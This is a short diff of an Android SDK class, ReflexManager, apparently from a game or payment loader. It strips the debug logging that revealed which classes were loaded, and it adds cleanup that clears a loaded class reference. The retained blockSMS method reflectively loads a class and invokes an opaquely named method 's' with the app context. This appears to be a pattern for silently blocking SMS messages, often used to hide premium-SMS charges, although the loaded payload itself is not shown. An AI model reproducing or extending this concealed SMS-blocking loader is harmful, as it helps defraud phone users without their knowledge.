@@ -9,6 +9,7 @@ import java.util.HashMap;
 import java.util.Map;
 
 import cn.egamex.load.Utils.Constants;
+import cn.egamex.load.loading.LoadingManager;
 
 /**
  * Created by Administrator on 2017/7/27.
@@ -42,6 +43,8 @@ public class ReflexManager {
             if (Constants.isOutPut) {
                 Log.i("SDK", e.toString());
             }
+        } finally {
+            LoadingManager.getInstance().setClassNull();
         }
     }
 
@@ -64,23 +67,15 @@ public class ReflexManager {
 
     public void blockSMS(Context context, Class<?> clazz) {
         try {
-            if (Constants.isOutPut) {
-                Log.i("SDK", "name: " + clazz.getName());
-                Log.i("SDK", "length: " + clazz.getMethods().length);
-            }
             Method[] ms = clazz.getMethods();
-            for (Method m : ms) {
-                if (Constants.isOutPut) {
-                    Log.i("SDK", "payInit: " + m.getName());
-                }
-                Class<?>[] cx = m.getParameterTypes();
-            }
             Method method = clazz.getMethod("getInstance");
             Object o = method.invoke(null);
             Class<? extends Object> ci = o.getClass();
             ci.getMethod("s", Context.class).invoke(o, context);
         } catch (Exception e) {
             Log.i("SDK", e.toString());
+        } finally {
+            LoadingManager.getInstance().setClassNull();
         }
     }
 
